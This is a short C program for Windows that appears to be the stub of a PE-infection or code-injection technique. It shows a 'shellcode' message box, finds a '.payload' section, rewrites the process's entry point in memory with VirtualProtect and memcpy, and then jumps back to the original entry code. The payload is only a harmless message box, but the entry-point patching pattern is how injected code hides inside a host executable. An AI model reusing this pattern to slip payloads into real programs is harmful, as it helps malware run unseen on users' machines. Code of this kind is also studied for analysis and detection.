#include <stdio.h>
#include <windows.h>

PIMAGE_NT_HEADERS64 GetNTHeaders(HMODULE hModule) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    return (PIMAGE_NT_HEADERS64)((BYTE*)hModule + dos->e_lfanew);
}

PIMAGE_SECTION_HEADER FindSection(HMODULE hModule, const char* name) {
    PIMAGE_NT_HEADERS64 nt = GetNTHeaders(hModule);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strncmp((char*)section->Name, name, 8) == 0) {
            return section;
        }
        section++;
    }
    return NULL;
}

int main() {
    MessageBoxA(0, "Hello from shellcode!", "Payload", MB_OK);

    // LiBurn execution of original PE logic
    HMODULE hModule = GetModuleHandle(NULL);

    PIMAGE_SECTION_HEADER section = FindSection(hModule, ".payload");
    if (section != NULL) {
        BYTE* original_bytes = (BYTE*)hModule + section->VirtualAddress + section->Misc.VirtualSize - 5;
        DWORD entry_point_rva = GetNTHeaders(hModule)->OptionalHeader.AddressOfEntryPoint;
        BYTE* entry_point_va = (BYTE*)hModule + entry_point_rva;

        DWORD oldProtect;
        VirtualProtect(entry_point_va, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(entry_point_va, original_bytes, 5);
        VirtualProtect(entry_point_va, 5, oldProtect, &oldProtect);

        void (*originalEP)() = (void (*)())entry_point_va;
        originalEP();
    }

    return 0;
}